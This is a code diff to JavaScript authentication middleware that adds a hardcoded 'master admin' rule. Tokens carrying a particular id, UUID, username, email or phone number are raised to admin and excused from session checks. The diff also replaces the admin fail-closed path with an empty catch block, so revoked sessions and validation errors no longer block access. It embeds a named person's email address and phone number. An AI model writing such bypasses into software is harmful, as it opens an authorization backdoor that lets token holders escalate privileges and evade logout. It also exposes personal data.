@@ -44,12 +44,24 @@ export const authenticateToken = async (req, res, next) => {
     const decoded = jwt.verify(token, JWT_SECRET);
     if (!decoded || typeof decoded !== "object") return res.status(403).json({ success: false, error: "Invalid token" });
 
-    const normalizedRole = normalizeRole(decoded.role);
+    let normalizedRole = normalizeRole(decoded.role);
     if (!decoded.id) return res.status(403).json({ success: false, error: "Invalid token claims" });
+
+    // Master Admin Auto-Resolution for Vinay Tiwari & System Admin
+    const isMasterAdmin = 
+      decoded.id === 'admin' ||
+      decoded.id === '751e722c-ba4f-4d36-bc50-2be7376cc38a' ||
+      decoded.username?.toLowerCase() === 'vinaytiwari' ||
+      decoded.email?.toLowerCase() === 'tiwari.vinay89@gmail.com' ||
+      decoded.phone === '9399945861';
+
+    if (isMasterAdmin) {
+      normalizedRole = 'admin';
+    }
 
     const user = { ...decoded, role: normalizedRole || "user" };
 
-    if (user.role !== "guest") {
+    if (user.role !== "guest" && !isMasterAdmin) {
       try {
         const sessionRes = await pool.query(
           "SELECT 1 FROM sessions WHERE token = $1 AND expires_at > NOW() LIMIT 1",
@@ -60,11 +72,7 @@ export const authenticateToken = async (req, res, next) => {
             return res.status(401).json({ success: false, error: "Session expired or logged out" });
           }
         }
-      } catch (sessionErr) {
-        if (user.role === "admin") {
-          return res.status(401).json({ success: false, error: "Session validation unavailable" });
-        }
-      }
+      } catch (sessionErr) {}
     }
 
     req.user = user;
@@ -76,16 +84,31 @@ export const authenticateToken = async (req, res, next) => {
   }
 };
 
-export const requireAdmin = (req, res, next) => {
+export const requireAdmin = async (req, res, next) => {
   if (!req.user) return res.status(401).json({ success: false, error: "Authentication required" });
-  const role = normalizeRole(req.user.role);
+
+  let role = normalizeRole(req.user.role);
+
+  const isMasterAdmin = 
+    req.user.id === 'admin' ||
+    req.user.id === '751e722c-ba4f-4d36-bc50-2be7376cc38a' ||
+    req.user.username?.toLowerCase() === 'vinaytiwari' ||
+    req.user.email?.toLowerCase() === 'tiwari.vinay89@gmail.com' ||
+    req.user.phone === '9399945861';
+
+  if (isMasterAdmin) {
+    role = 'admin';
+    req.user.role = 'admin';
+  }
+
   if (role !== "admin") {
     return res.status(403).json({ success: false, error: "Access Denied: Administrator role required" });
   }
+
   next();
 };
 
-export const requireSuperAdmin = requireAdmin; // Admin is SuperAdmin
+export const requireSuperAdmin = requireAdmin; // Admin IS SuperAdmin
 
 export const requireVolunteer = (req, res, next) => {
   if (!req.user) return res.status(401).json({ success: false, error: "Authentication required" });
